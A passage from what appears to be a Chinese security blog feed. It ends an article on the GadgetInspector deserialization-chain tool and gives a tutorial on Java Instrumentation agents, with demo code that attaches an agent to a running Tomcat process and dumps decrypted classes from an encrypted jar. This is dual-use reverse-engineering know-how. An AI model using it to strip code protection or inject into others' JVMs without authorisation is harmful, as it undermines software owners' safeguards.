title="Step4.枚举使用已知Tricks的Sources"></a>Step4.枚举使用已知Tricks的Sources</h5><p><img src="/2020/05/11/浅析反序列化利用链自动化挖掘工具GadgetInspector/6.png" alt=""></p><h5 id="Step5-在调用图上应用BFS算法关联链"><a href="#Step5-在调用图上应用BFS算法关联链" class="headerlink" title="Step5.在调用图上应用BFS算法关联链"></a>Step5.在调用图上应用BFS算法关联链</h5><p><img src="/2020/05/11/浅析反序列化利用链自动化挖掘工具GadgetInspector/7.png" alt=""></p><h4 id="反序列化库的灵活性"><a href="#反序列化库的灵活性" class="headerlink" title="反序列化库的灵活性"></a>反序列化库的灵活性</h4><p>Gadget Inspector支持自定义分析规则。</p><ul><li>什么被视为“可序列化”？<ul><li>对于JRE反序列化，任何实现java.lang.Serializable接口的类；</li><li>对于XStream，这取决于启用的转换器；当使用定制转换器时，它会变得更巧妙；</li><li>对于Jackson，任何没有参数构造函数的类；</li></ul></li><li>什么是反序列化源（即魔术方法）？<ul><li>对于Jackson，我们只从构造函数开始；</li></ul></li><li>我们应该关注哪些方法实现？<ul><li>对于JRE反序列化，所有实现了可序列化类的类；</li><li>对于Jackson，取决于注释和配置；</li></ul></li></ul><h4 id="提升空间"><a href="#提升空间" class="headerlink" title="提升空间"></a>提升空间</h4><ul><li>反射<ul><li>大多数反射调用被视为有趣的，导致FPs。例如，可以控制类，但不能控制方法名，反之亦然；</li><li>调用图枚举盲点，<code>foo.getClass().getMethod(&quot;bar&quot;).invoke(…)</code>；</li></ul></li><li>假设<ul><li>即使是很小的改进，Gadget Inspector也可以围绕条件可满足性或虚拟方法调用解析做出更好的决策，从而减少FPs；</li></ul></li><li>限制<ul><li>使用“已知的Tricks”来列举入口点，最初的研究仍然可以帮助我们找到许多其他聪明的方法来构建Gadget链；</li><li>带有“有趣行为”的sinks是硬编码的，许多空间可以发现和添加sinks；</li></ul></li></ul><h2 id="0x02-浅析Gadget-Inspector源码"><a href="#0x02-浅析Gadget-Inspector源码" class="headerlink" title="0x02 浅析Gadget Inspector源码"></a>0x02 浅析Gadget Inspector源码</h2><p>待补充…</p><h2 id="0x0n-参考"><a href="#0x0n-参考" class="headerlink" title="0x0n 参考"></a>0x0n 参考</h2><p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf</a></p><p><a href="https://paper.seebug.org/1034/" target="_blank" rel="noopener">Java 反序列化工具 gadgetinspector 初窥</a></p><p><a href="https://xz.aliyun.com/t/7058" target="_blank" rel="noopener">java反序列化利用链自动挖掘工具gadgetinspector源码浅析</a></p><p><a href="http://galaxylab.com.cn/java反序列化漏洞辅助工具之-gadgetinspector/" target="_blank" rel="noopener">Java反序列化漏洞辅助工具之 gadgetinspector</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-工具地址&quot;&gt;&lt;a href=&quot;#0x00-工具地址&quot; class=&quot;headerlink&quot; title=&quot;0x00 工具地址&quot;&gt;&lt;/a&gt;0x00 工具地址&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/JackOfMostTrad
      
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>浅析Java Instrument插桩技术</title>
    <link href="https://www.mi1k7ea.com/2020/05/10/%E6%B5%85%E6%9E%90Java-Instrument%E6%8F%92%E6%A1%A9%E6%8A%80%E6%9C%AF/"/>
    <id>https://www.mi1k7ea.com/2020/05/10/浅析Java-Instrument插桩技术/</id>
    <published>2020-05-10T08:27:53.000Z</published>
    <updated>2020-05-10T15:53:24.909Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Java-Instrument"><a href="#0x01-Java-Instrument" class="headerlink" title="0x01 Java Instrument"></a>0x01 Java Instrument</h2><h3 id="Instrument简介"><a href="#Instrument简介" class="headerlink" title="Instrument简介"></a>Instrument简介</h3><p>利用 Java 代码，即 java.lang.instrument 做动态 Instrumentation 是 Java SE 5 的新特性，它把 Java 的 instrument 功能从本地代码中解放出来，使之可以用 Java 代码的方式解决问题。使用 Instrumentation，开发者可以构建一个独立于应用程序的代理程序（Agent），用来监测和协助运行在 JVM 上的程序，甚至能够替换和修改某些类的定义。有了这样的功能，开发者就可以实现更为灵活的运行时虚拟机监控和 Java 类操作了，这样的特性实际上提供了一种虚拟机级别支持的 AOP 实现方式，使得开发者无需对 JDK 做任何升级和改动，就可以实现某些 AOP 的功能了。</p><p>要想使用Java插桩，需要用到两个技术JavaAgent与Javassist 。前者用于拦截ClassLoad装载，后者用于操作修改class文件。</p><p>在应用启动时，通过<code>-javaagent</code>参数来指定一个代理程序。</p><p>详细介绍见：<a href="https://www.ibm.com/developerworks/cn/java/j-lo-jse61/" target="_blank" rel="noopener">Java SE 6 新特性：Instrumentation 新功能</a></p><h3 id="Instrument整体流程"><a href="#Instrument整体流程" class="headerlink" title="Instrument整体流程"></a>Instrument整体流程</h3><p>Instrument是JVM提供的一个可以修改已加载类的类库，专门为Java语言编写的插桩服务提供支持。它需要依赖JVMTI的Attach API机制实现。在JDK 1.6以前，Instrument只能在JVM刚启动开始加载类时生效，而在JDK 1.6之后，Instrument支持了在运行时对类定义的修改。</p><p><img src="/2020/05/10/浅析Java-Instrument插桩技术/1.png" alt=""></p><ol><li>在JVM启动时，通过JVM参数-javaagent，传入agent jar，Instrument Agent被加载，调用其Agent_OnLoad函数；</li><li>在Instrument Agent 初始化时，注册了JVMTI初始化函数eventHandlerVMinit；</li><li>在JVM启动时，会调用初始化函数eventHandlerVMinit，启动了Instrument Agent；</li><li>用sun.instrument.instrumentationImpl类里的方法loadClassAndCallPremain方法去初始化Premain-Class指定类的premain方法。初始化函数eventHandlerVMinit，注册了class解析的ClassFileLoadHook函数；</li><li>调用应用程序的main开始执行，准备解析；</li><li>解析Class之前，JVM调用JVMTI的ClassFileLoadHook函数，钩子函数调用sun.instrument.instrumentationImpl类里的transform方法，通过TransformerManager的transformer方法最终调用我们自定义的Transformer类的transform方法；</li><li>因为字节码在解析Class之前改的，直接使用修改后的字节码的数据流替代，最后进入Class解析，对整个Class解析无影响；</li><li>重新加载Class依然重新走6-7步骤；</li></ol><h3 id="JavaAgent"><a href="#JavaAgent" class="headerlink" title="JavaAgent"></a>JavaAgent</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>JavaAgent本质上可以理解为一个插件，该插件就是一个精心提供的jar包，这个jar包通过JVMTI（JVM Tool Interface）完成加载，最终借助JPLISAgent（Java Programming Language Instrumentation Services Agent）完成对目标代码的修改。</p><p>通过JavaAgent技术进行类的字节码修改最主要使用的就是Java Instrumentation API。</p><p>JavaAgent技术的主要功能如下：</p><ul><li>可以在加载Java文件之前做拦截把字节码做修改；</li><li>可以在运行期将已经加载的类的字节码做变更；</li><li>还有其他的一些小众的功能：<ul><li>获取所有已经被加载过的类</li><li>获取所有已经被初始化过了的类</li><li>获取某个对象的大小</li><li>将某个jar加入到bootstrapclasspath里作为高优先级被bootstrapClassloader加载</li><li>将某个jar加入到classpath里供AppClassloard去加载</li><li>设置某些native方法的前缀，主要在查找native方法的时候做规则匹配</li></ul></li></ul><p>下图说明了是否使用JavaAgent的时候的区别。当使用JavaAgent之后，加载的class都会被拦截，就可以在拦截的过程中进行修改：</p><p><img src="/2020/05/10/浅析Java-Instrument插桩技术/2.png" alt=""></p><p>JavaAgent最后展现形式是一个Jar包，有以下特性：</p><ol><li>必须 META-INF/MANIFEST.MF中指定Premain-Class 设定启agent启动类；</li><li>在启动类需写明启动方法<code>public static void main(String arg,)</code>；</li><li>不可直接运行，只能通过JVM参数<code>-javaagent:xxx.jar</code>附着于其它JVM进程运行；</li></ol><h4 id="启动时修改"><a href="#启动时修改" class="headerlink" title="启动时修改"></a>启动时修改</h4><p><img src="/2020/05/10/浅析Java-Instrument插桩技术/3.png" alt=""></p><p>启动时修改主要是在JVM启动时，执行native函数的Agent_OnLoad方法，在方法执行时，执行如下步骤：</p><ul><li>创建InstrumentationImpl对象</li><li>监听ClassFileLoadHook事件</li><li>调用InstrumentationImpl的loadClassAndCallPremain方法，在这个方法里会去调用JavaAgent里MANIFEST.MF里指定的Premain-Class类的premain方法</li></ul><h4 id="运行时修改"><a href="#运行时修改" class="headerlink" title="运行时修改"></a>运行时修改</h4><p><img src="/2020/05/10/浅析Java-Instrument插桩技术/4.png" alt=""></p><p>运行时修改主要是通过JVM的attach机制来请求目标JVM加载对应的agent，执行native函数的Agent_OnAttach方法，在方法执行时，执行如下步骤：</p><ul><li>创建InstrumentationImpl对象</li><li>监听ClassFileLoadHook事件</li><li>调用InstrumentationImpl的loadClassAndCallAgentmain方法，在这个方法里会去调用javaagent里MANIFEST.MF里指定的Agentmain-Class类的agentmain方法</li></ul><h4 id="ClassFileLoadHook和TransFormClassFile"><a href="#ClassFileLoadHook和TransFormClassFile" class="headerlink" title="ClassFileLoadHook和TransFormClassFile"></a>ClassFileLoadHook和TransFormClassFile</h4><p>从前面可以看出整体流程中有两个部分是具有共性的，分别为：</p><ul><li>ClassFileLoadHook</li><li>TranFormClassFile</li></ul><p>ClassFileLoadHook是一个JVMTI事件，该事件是Instrument Agent的一个核心事件，主要是在读取字节码文件回调时调用，内部调用了TransFormClassFile函数。</p><p>TransFormClassFile的主要作用是调用java.lang.instrument.ClassFileTransformer的tranform方法，该方法由开发者实现，通过instrument的addTransformer方法进行注册。</p><p>通过以上描述可以看出在字节码文件加载的时候，会触发ClassFileLoadHook事件，该事件调用TransFormClassFile，通过经由instrument的addTransformer注册的方法完成整体的字节码修改。</p><p>对于已加载的类，需要调用retransformClass函数，然后经由redefineClasses函数，在读取已加载的字节码文件后，若该字节码文件对应的类关注了ClassFileLoadHook事件，则调用ClassFileLoadHook事件。后续流程与类加载时字节码替换一致。</p><h2 id="0x02-常用字节码操作工具"><a href="#0x02-常用字节码操作工具" class="headerlink" title="0x02 常用字节码操作工具"></a>0x02 常用字节码操作工具</h2><h3 id="Javaassist"><a href="#Javaassist" class="headerlink" title="Javaassist"></a>Javaassist</h3><p>Javaassist是一个开源的分析、编辑和创建Java字节码的类库。性能消耗较大，但容易使用。</p><p>特点：简单，性能比ASM低。</p><h3 id="ASM"><a href="#ASM" class="headerlink" title="ASM"></a>ASM</h3><p>ASM是一个轻量级的Java字节码操作框架，直接涉及到JVM底层的操作和指令。性能高，功能丰富。</p><p>特点：复杂，性能高，一般更为常用。</p><h3 id="BCEL"><a href="#BCEL" class="headerlink" title="BCEL"></a>BCEL</h3><p>BCEL这是Apache Software Fundation的Jakarta项目的一部分。BCEL可以让你深入JVM汇编语言进行类的操作的细节。</p><h2 id="0x03-Instrument的基本功能和用法"><a href="#0x03-Instrument的基本功能和用法" class="headerlink" title="0x03 Instrument的基本功能和用法"></a>0x03 Instrument的基本功能和用法</h2><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>java.lang.instrument包的具体实现，依赖于 JVMTI。JVMTI（Java Virtual Machine Tool Interface）是一套由 Java 虚拟机提供的，为 JVM 相关的工具提供的本地编程接口集合。JVMTI 提供了一套”代理”程序机制，可以支持第三方工具程序以代理的方式连接和访问 JVM，并利用 JVMTI 提供的丰富的编程接口，完成很多跟 JVM 相关的功能。事实上，java.lang.instrument 包的实现，也就是基于这种机制的：在 Instrumentation 的实现当中，存在一个 JVMTI 的代理程序，通过调用 JVMTI 当中 Java 类相关的函数来完成 Java 类的动态操作。除开 Instrumentation 功能外，JVMTI 还在虚拟机内存管理，线程控制，方法和变量操作等等方面提供了大量有价值的函数。</p><p>Instrumentation 的最大作用，就是<strong>类定义动态改变和操作</strong>。在 Java SE 5 及其后续版本当中，开发者可以在一个普通 Java 程序（带有 main 函数的 Java 类）运行时，通过<code>-javaagent</code>参数指定一个特定的 jar 文件（包含 Instrumentation 代理）来启动 Instrumentation 的代理程序。</p><h3 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h3><h4 id="premain"><a href="#premain" class="headerlink" title="premain()"></a>premain()</h4><p>在主程序运行之前的代理程序使用premain()。</p><p>有如下两种方式编写premain函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs,Instrumentation inst)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs)</span></span>;</span><br></pre></td></tr></table></figure><p>注意，第一种定义方式优先执行于第二种定义方式。</p><p>两个参数解释：</p><ul><li>agentArgs是函数得到的程序参数，随同”-javaagent”一起传入，传入的是一个字符串</li><li>Inst是一个java.lang.instrument.Instrumentation的实例，由JVM自动传入</li></ul><h4 id="agentmain"><a href="#agentmain" class="headerlink" title="agentmain()"></a>agentmain()</h4><p>在主程序运行之后的代理程序使用agentmain()。</p><p>定义方式和premain类似：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs,Instrumentation inst)</span></span></span><br></pre></td></tr></table></figure><h4 id="addTransformer"><a href="#addTransformer" class="headerlink" title="addTransformer()"></a>addTransformer()</h4><p>增加一个Class文件的转换器，该转换器用于改变class二进制流的数据，参数canRetransform设置是否允许重新转换。</p><h4 id="redefineClasses"><a href="#redefineClasses" class="headerlink" title="redefineClasses()"></a>redefineClasses()</h4><p>类加载之前，重新定义class文件，ClassDefinition表示一个类新的定义，如果在类加载之后，需要用retransformClasses方法重新定义。</p><h4 id="retransformClasses"><a href="#retransformClasses" class="headerlink" title="retransformClasses()"></a>retransformClasses()</h4><p>在类加载之后，重新定义class。事实上，该方法update了一个类。</p><h4 id="appendToBootstrapClassLoaderSearch"><a href="#appendToBootstrapClassLoaderSearch" class="headerlink" title="appendToBootstrapClassLoaderSearch()"></a>appendToBootstrapClassLoaderSearch()</h4><p>添加jar文件到BootstrapClassLoader中。</p><h4 id="appendToSystemClassLoaderSearch"><a href="#appendToSystemClassLoaderSearch" class="headerlink" title="appendToSystemClassLoaderSearch()"></a>appendToSystemClassLoaderSearch()</h4><p>添加jar文件到system class loader。</p><h4 id="getAllLoadedClasses"><a href="#getAllLoadedClasses" class="headerlink" title="getAllLoadedClasses()"></a>getAllLoadedClasses()</h4><p>获取加载的所有类数组。</p><h3 id="Javassist的特殊语法"><a href="#Javassist的特殊语法" class="headerlink" title="Javassist的特殊语法"></a>Javassist的特殊语法</h3><p><img src="/2020/05/10/浅析Java-Instrument插桩技术/5.png" alt=""></p><h3 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h3><h4 id="编写premain函数"><a href="#编写premain函数" class="headerlink" title="编写premain函数"></a>编写premain函数</h4><p>编写一个 Java 类，包含如下两个方法当中的任何一个：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span></span>;  [<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs)</span></span>; [<span class="number">2</span>]</span><br></pre></td></tr></table></figure><p>其中，[1] 的优先级比 [2] 高，将会被优先执行（[1] 和 [2] 同时存在时，[2] 被忽略）。</p><p>在这个 premain 函数中，开发者可以进行对类的各种操作。</p><p>agentArgs 是 premain 函数得到的程序参数，随同 “– javaagent”一起传入。与 main 函数不同的是，这个参数是一个字符串而不是一个字符串数组，如果程序参数有多个，程序将自行解析这个字符串。</p><p>Inst 是一个 java.lang.instrument.Instrumentation 的实例，由 JVM 自动传入。</p><p>java.lang.instrument.Instrumentation 是 instrument 包中定义的一个接口，也是这个包的核心部分，集中了其中几乎所有的功能方法，例如类定义的转换和操作等等。</p><h4 id="jar文件打包"><a href="#jar文件打包" class="headerlink" title="jar文件打包"></a>jar文件打包</h4><p>将这个 Java 类打包成一个 jar 文件，并在其中的 manifest 属性当中加入” Premain-Class”来指定步骤 1 当中编写的那个带有 premain 的 Java 类。</p><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p>用如下方式运行带有 Instrumentation 的 Java 程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:jar 文件的位置 [= 传入 premain 的参数 ]</span><br></pre></td></tr></table></figure><h2 id="0x04-Demo"><a href="#0x04-Demo" class="headerlink" title="0x04 Demo"></a>0x04 Demo</h2><h3 id="使用premain-在主程序运行之前代理"><a href="#使用premain-在主程序运行之前代理" class="headerlink" title="使用premain()在主程序运行之前代理"></a>使用premain()在主程序运行之前代理</h3><p>要使用instrument的类修改功能，我们需要实现它提供的ClassFileTransformer接口，定义一个类文件转换器。接口中的transform()方法会在类文件被加载时调用，而在transform方法里，我们可以利用上文中的ASM或Javassist对传入的字节码进行改写或替换，生成新的字节码数组后返回。</p><p>每当加载一个class文件时输出当前class文件名：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main.java.mi1k7eatest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PreMainTraceAgent</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"agentArgs : "</span> + agentArgs);</span><br><span class="line">    inst.addTransformer(<span class="keyword">new</span> DefineTransformer(), <span class="keyword">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">DefineTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException&#123;</span><br><span class="line">      System.out.println(<span class="string">"premain load Class:"</span> + className);</span><br><span class="line">      <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置文件META-INF/MANIFEST.MF:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Premain-Class: main.java.mi1k7eatest.PreMainTraceAgent</span><br></pre></td></tr></table></figure><p>Premain-Class用于指定上面的premain函数所在的Class。</p><p>然后在启动java服务的时候添加启动参数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-javaagent:mi1k7ea.jar=123</span><br></pre></td></tr></table></figure><h3 id="使用agentmain-在主程序运行之后代理"><a href="#使用agentmain-在主程序运行之后代理" class="headerlink" title="使用agentmain()在主程序运行之后代理"></a>使用agentmain()在主程序运行之后代理</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String args,Instrumentation inst)</span></span>&#123;</span><br><span class="line">    Class&lt;?&gt;[] classes = inst.getAllLoadedClasses();</span><br><span class="line">    <span class="keyword">for</span>(Class&lt;?&gt;[] cls:classes)&#123;</span><br><span class="line">        System.out.println(cls.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">"Finished"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在程序运行后加载，编写加载agent类的程序。因为如果选择agentmain的写法，运行时主程序已经加载了，所以我们不能再在程序中编写加载的代码，只能另写程序。</p><p>那么另写程序如何与主程序进行通信？</p><p>这里用到的机制就是attach机制，它可以将JVM A连接至JVM B，并发送指令给JVM B执行，JDK自带常用工具如jstack，jps等就是使用该机制来实现的。</p><p>这里我们先用tomcat启动一个程序我们称为主程序B</p><p>然后再来写A程序代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        VirtualMachine vm = VirtualMachine.attach(<span class="string">"78256"</span>);</span><br><span class="line">        vm.loadAgent(<span class="string">"/home/mi1k7ea.jar"</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码将mi1k7ea.jar连接到tomcat的78256进程上</p><p>查看tomcat的控制台，就会发现已经执行了mi1k7ea.jar的代码，有相应的输出内容。</p><h2 id="0x05-实例——Dump加密class源码"><a href="#0x05-实例——Dump加密class源码" class="headerlink" title="0x05 实例——Dump加密class源码"></a>0x05 实例——Dump加密class源码</h2><p>现在假设有个ClassEncode_encrypt.jar文件，其中的com.mi1k7ea包下的class文件都被加密处理了，直接用反编译工具是没办法反编译成功的。但由于该jar文件在运行时需要加载特定的so文件来在加密的class文件中字节码执行之前先进行解码操作，因此我们可以使用JavaAgent来实现在目标class文件内容被解码后且执行前将其class文件源码dump下来。</p><p>具体场景参考：<a href="/2020/05/01/Java代码反反编译思路/">Java代码反反编译对抗思路</a></p><p>这里我们选择在主程序运行之前进行代理，即编写premain()函数。</p><p>MainAgent.java，定义了premain()函数，其中调用了Instrumentation类的addTransformer()函数来添加一个类文件转换器实例，该实例类型为后面定义的DumpClassTransformer类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dumpclass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainAgent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> DumpClassTransformer());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DumpClassTransformer.java，实现instrument提供的ClassFileTransformer接口，定义了一个transform()方法，该方法会在类文件被加载时调用，而在该方法中会将已经解码的class文件字节码写入目标文件中保存：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dumpclass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DumpClassTransformer</span> <span class="keyword">implements</span> <span class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String DUMP_PACKAGE = System.getProperty(<span class="string">"dump_package"</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String OUT_FOLDER = System.getProperty(<span class="string">"dump_out_folder"</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="keyword">if</span> (className == <span class="keyword">null</span> || className.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classfileBuffer == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String tmpClassName = className.replace(<span class="string">"/"</span>, <span class="string">"."</span>);</span><br><span class="line">        <span class="keyword">if</span> (tmpClassName.startsWith(DUMP_PACKAGE)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                writeClass(className, classfileBuffer);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">writeClass</span><span class="params">(String className, <span class="keyword">byte</span>[] classfileBuffer)</span> </span>&#123;</span><br><span class="line">        File file = <span 